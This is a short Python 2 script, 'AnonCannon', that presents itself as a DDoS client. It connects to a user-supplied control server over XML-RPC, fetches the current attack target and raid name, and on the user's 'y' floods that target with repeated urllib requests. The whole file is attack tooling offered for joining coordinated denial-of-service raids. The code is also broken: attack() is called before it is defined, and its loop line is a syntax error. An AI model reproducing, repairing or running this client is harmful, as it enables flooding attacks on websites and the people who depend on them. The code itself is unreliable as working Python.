#!/usr/bin/env python
#AnnonCannon DDoS  client
#Take it Down!
import xmlrpclib                       #For server communication
import urllib                          #For the worst DDoS Algo every
print "AnonCannon ALPHA 1 Client"
print "-----------------------------------------------------------------"
address       = raw_input("Enter your Control server>>>")
cli           = xmlrpclib.Server(address)
attack_target = cli.current_attack_address()
attacking     = False
print cli.welcome_message()
print("Actual Attack target of " + cli.get_raid_name()  + ":" + attack_target)
answer = raw_input("Do you want to join the Attack(y/n):")
if(answer == "y"):
  print "Joining the Attack on:" + attack_target
  attacking = True
  attack(attack_target)
if(answer == "n"):
  print "Quiting..."
  exit()
#ALPHA ATTACK ALGO - I PROMISE I USE A BETTER IN HE FINAL RELEASE!-!
def attack(url_to_hit):
  print "[!!!]Now attacking."
  try:
      while(attacking = True)
      ul = urllib.urlopen(attack_target)
  except KeyboardInterrupt:
    answer = raw_input("Do you want to quit?(y/n)")
    if(answer == "y"):
      print "Quiting."
      exit()
    if(answer == "n"):
      raise

